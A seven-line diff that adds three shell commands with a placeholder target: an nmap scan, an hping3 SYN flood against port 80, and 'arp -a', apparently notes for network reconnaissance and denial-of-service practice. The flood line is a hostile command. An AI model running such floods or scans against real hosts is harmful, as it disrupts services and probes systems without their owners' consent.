@@ -1,0 +1,7 @@
+nmap <TARGET_IP>
+
+
+hping3 -S -p 80 --flood <TARGET_IP>
+
+
+arp -a
